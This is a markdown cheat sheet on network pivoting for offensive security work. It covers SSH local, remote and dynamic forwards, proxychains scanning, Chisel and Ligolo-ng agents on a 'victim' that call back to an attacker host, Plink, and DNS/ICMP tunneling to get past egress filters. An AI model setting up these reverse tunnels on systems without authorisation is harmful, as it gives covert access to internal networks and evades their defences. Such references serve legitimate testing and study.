# Tunneling & Port Forwarding

## SSH Local Port Forward (access a remote-only service from your machine)
```bash
ssh -L 8080:internal-host:80 user@pivot-box
# now localhost:8080 on your machine reaches internal-host:80
```

## SSH Remote Port Forward (expose your machine to a target that can't reach you directly)
```bash
ssh -R 4444:localhost:4444 user@pivot-box
```

## SSH Dynamic Port Forward (SOCKS proxy — full pivot)
```bash
ssh -D 1080 user@pivot-box
# then route tools through it:
proxychains nmap -sT -Pn 10.10.10.0/24
```
Add `socks4 127.0.0.1 1080` to `/etc/proxychains.conf`.

## Chisel (when SSH isn't available on the pivot)
```bash
# attacker (server)
./chisel server -p 8000 --reverse

# victim/pivot (client)
./chisel client <attacker-ip>:8000 R:1080:socks
# then proxychains through 127.0.0.1:1080 as above
```

## Ligolo-ng (modern tunneling, creates a virtual interface — cleaner than SOCKS for full subnet access)
```bash
# attacker
./proxy -selfcert
# agent on pivot
./agent -connect <attacker-ip>:11601 -ignore-cert
# then in proxy console: session, then start, then add a route to the new tun interface
```

## Plink (Windows pivot, no SSH client installed)
```powershell
plink.exe -ssh -D 1080 user@attacker-ip
```

## When Everything Is Blocked: DNS/ICMP Tunneling
- `dnscat2` or `iodine` for DNS tunneling when only DNS egress is allowed.
- `ptunnel` for ICMP tunneling when only ping is allowed outbound.

## Practical Order of Preference
1. SSH (if available on the pivot) — reliable, encrypted, no extra binaries.
2. Chisel/Ligolo — when you need to drop a static binary but no SSH.
3. DNS/ICMP tunneling — last resort, very slow, but works when everything else is filtered.